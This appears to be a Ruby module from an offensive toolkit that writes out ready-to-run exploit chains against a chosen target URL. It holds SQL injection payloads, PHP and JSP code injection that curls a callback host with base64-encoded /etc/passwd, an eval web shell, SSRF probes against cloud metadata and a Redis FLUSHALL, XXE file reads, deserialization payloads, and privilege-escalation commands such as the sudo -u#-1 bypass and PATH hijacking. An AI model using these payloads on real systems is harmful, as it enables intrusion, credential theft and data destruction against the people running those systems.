require 'uri'
require 'net/http'
require 'base64'
require_relative '../utils/network'
require_relative '../utils/colorize'

class ExploitChains
  def self.generate_full_chain(target_url, callback_url)
    chain = <<~RUBY
      require 'net/http'
      require 'uri'
      require 'base64'
      
      target = '#{target_url}'
      callback = '#{callback_url}'
      
      def exploit_sqli(url)
        payloads = [
          "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
          "' UNION SELECT NULL,@@version,NULL--",
          "'; EXEC xp_cmdshell('whoami');--"
        ]
        
        payloads.each do |payload|
          test_url = url + "?id=#{URI.encode_www_form_component(payload)}"
          res = Net::HTTP.get_response(URI(test_url))
          if res.body.include?('root:') || res.body.include?('Microsoft')
            return res.body
          end
        end
        nil
      end
      
      def exploit_rce(url)
        payloads = [
          "<?php system('curl #{callback_url}?data='.base64_encode(file_get_contents('/etc/passwd'))); ?>",
          "<?php eval($_GET['cmd']); ?>",
          "<% Runtime.getRuntime().exec('curl #{callback_url}'); %>"
        ]
        
        payloads.each do |payload|
          test_url = url + "?file=#{URI.encode_www_form_component(payload)}"
          res = Net::HTTP.get_response(URI(test_url))
          if res.code == '200'
            return true
          end
        end
        false
      end
      
      def exploit_ssrf(url)
        internal_targets = [
          'http://127.0.0.1:22',
          'http://127.0.0.1:3306',
          'http://127.0.0.1:6379',
          'http://169.254.169.254/latest/meta-data/',
          'file:///etc/passwd',
          'gopher://127.0.0.1:6379/_FLUSHALL'
        ]
        
        internal_targets.each do |target|
          test_url = url + "?url=#{URI.encode_www_form_component(target)}"
          res = Net::HTTP.get_response(URI(test_url))
          if res.body.include?('root:') || res.body.include?('SSH') || res.body.length > 1000
            return target
          end
        end
        nil
      end
      
      def exploit_xxe(url)
        xxe_payload = <<~XML
          <?xml version="1.0"?>
          <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
          <!ENTITY xxe2 SYSTEM "#{callback_url}?data=xxe">
          ]>
          <root>&xxe;&xxe2;</root>
        XML
        
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = 'application/xml'
        req.body = xxe_payload
        
        res = http.request(req)
        res.body.include?('root:')
      end
      
      def exploit_deserialization(url)
        java_payload = Base64.strict_encode64("\xac\xed\x00\x05")
        php_payload = 'O:8:"stdClass":1:{s:4:"test";s:10:"<?php system($_GET["c"]); ?>";}'
        
        [java_payload, php_payload].each do |payload|
          test_url = url + "?data=#{URI.encode_www_form_component(payload)}"
          res = Net::HTTP.get_response(URI(test_url))
          if res.code == '500' || res.body.include?('java') || res.body.include?('unserialize')
            return true
          end
        end
        false
      end
      
      puts "Starting exploit chain on #{target}"
      
      result = exploit_sqli(target)
      puts "SQLi: #{result ? 'SUCCESS' : 'FAILED'}"
      
      result = exploit_rce(target)
      puts "RCE: #{result ? 'SUCCESS' : 'FAILED'}"
      
      result = exploit_ssrf(target)
      puts "SSRF: #{result ? 'SUCCESS - ' + result : 'FAILED'}"
      
      result = exploit_xxe(target)
      puts "XXE: #{result ? 'SUCCESS' : 'FAILED'}"
      
      result = exploit_deserialization(target)
      puts "Deserialization: #{result ? 'SUCCESS' : 'FAILED'}"
    RUBY
    
    filename = "exploit_chain_#{Time.now.to_i}.rb"
    File.write(filename, chain)
    puts Colorize.green("Exploit chain saved: #{filename}")
    filename
  end

  def self.generate_privilege_escalation(target_url)
    escalation = <<~RUBY
      require 'net/http'
      require 'uri'
      
      target = '#{target_url}'
      
      def test_sudo_bypass(url)
        payloads = [
          "sudo -u#-1 id",
          "sudo -u#4294967295 id",
          "sudo -u#$(python -c 'print(0xFFFFFFFF)') id"
        ]
        
        payloads.each do |payload|
          test_url = url + "?cmd=#{URI.encode_www_form_component(payload)}"
          res = Net::HTTP.get_response(URI(test_url))
          if res.body.include?('uid=0') || res.body.include?('root')
            return payload
          end
        end
        nil
      end
      
      def test_path_hijack(url)
        payloads = [
          "export PATH=/tmp:$PATH; echo '#!/bin/sh' > /tmp/id; chmod +x /tmp/id; id",
          "export PATH=/tmp:$PATH; ln -s /bin/sh /tmp/id; id"
        ]
        
        payloads.each do |payload|
          test_url = url + "?cmd=#{URI.encode_www_form_component(payload)}"
          res = Net::HTTP.get_response(URI(test_url))
          if res.body.include?('uid=0')
            return payload
          end
        end
        nil
      end
      
      def test_capabilities(url)
        payloads = [
          "python -c 'import os; os.setuid(0); os.system(\"id\")'",
          "perl -e 'use POSIX qw(setuid); setuid(0); system(\"id\");'"
        ]
        
        payloads.each do |payload|
          test_url = url + "?cmd=#{URI.encode_www_form_component(payload)}"
          res = Net::HTTP.get_response(URI(test_url))
          if res.body.include?('uid=0')
            return payload
          end
        end
        nil
      end
      
      puts "Testing privilege escalation on #{target}"
      
      result = test_sudo_bypass(target)
      puts "Sudo bypass: #{result ? 'SUCCESS - ' + result : 'FAILED'}"
      
      result = test_path_hijack(target)
      puts "Path hijack: #{result ? 'SUCCESS - ' + result : 'FAILED'}"
      
      result = test_capabilities(target)
      puts "Capabilities: #{result ? 'SUCCESS - ' + result : 'FAILED'}"
    RUBY
    
    filename = "privesc_#{Time.now.to_i}.rb"
    File.write(filename, escalation)
    puts Colorize.green("Privilege escalation script saved: #{filename}")
    filename
  end
end

